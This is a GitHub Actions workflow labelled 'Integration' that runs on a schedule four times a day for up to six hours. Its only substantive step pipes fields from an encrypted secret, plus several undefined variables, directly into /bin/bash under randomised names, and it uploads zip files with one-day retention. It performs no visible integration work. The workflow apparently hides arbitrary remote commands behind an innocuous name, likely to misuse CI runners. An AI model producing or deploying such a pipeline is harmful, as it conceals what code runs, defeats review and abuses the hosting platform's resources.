name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '54 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          lx0: ${{ secrets.lx0 }}
        run: |
          printf '%s' "$lx0" | jq -r .azwr553 | /bin/bash
          echo $s80923 | jq -r .hqnm54280 | /bin/bash
          echo $mqg121 | jq -r .jyv304 | /bin/bash
          printf '%s' "$zbkw941" | jq -r .jub1 | /bin/bash
          printf '%s' "$vcmfm735" | jq -r .tgp64 | /bin/bash
          printf '%s' "$huf3" | jq -r .xbk5 | /bin/bash
          echo $g2455 | jq -r .eq4 | /bin/bash
          printf '%s' "$kdk64517" | jq -r .r10 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ploXRVAU
          path: "*.zip"
          retention-days: 1
